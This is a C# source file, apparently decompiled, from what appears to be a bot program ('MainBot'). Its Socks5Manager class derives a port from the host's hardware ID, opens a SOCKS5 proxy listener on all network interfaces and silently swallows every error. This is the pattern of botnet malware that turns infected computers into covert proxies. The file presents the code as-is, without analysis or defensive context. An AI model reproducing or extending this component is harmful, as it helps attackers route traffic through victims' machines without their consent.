namespace Socks5
{
    using MainBot;
    using System;
    using System.Net;
    using System.Net.Sockets;

    internal class Socks5Manager
    {
        private static Socket socket_0 = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        private static void AcceptSocket(IAsyncResult iasyncResult_0)
        {
            try
            {
                Socket socket = ((Socket) iasyncResult_0.AsyncState).EndAccept(iasyncResult_0);
                if (socket != null)
                {
                    new Socks5Class(socket).RecieveSocks5();
                }
                ((Socket) iasyncResult_0.AsyncState).BeginAccept(new AsyncCallback(Socks5Manager.AcceptSocket), (Socket) iasyncResult_0.AsyncState);
            }
            catch
            {
            }
        }

        public static void SelectPortAndListen()
        {
            try
            {
                uint num = 0x1388;
                for (int i = 0; i < Configuration.HWID1.Length; i++)
                {
                    num += Configuration.HWID1[i];
                }
                Configuration.ushort_0 = (ushort) (num % 0xfde8);
                socket_0.Bind(new IPEndPoint(IPAddress.Any, Configuration.ushort_0));
                socket_0.Listen(20);
                socket_0.BeginAccept(new AsyncCallback(Socks5Manager.AcceptSocket), socket_0);
            }
            catch
            {
                SocketClose();
            }
        }

        public static void SocketClose()
        {
            try
            {
                Configuration.ushort_0 = 0;
                socket_0.Close();
            }
            catch
            {
            }
        }
    }
}

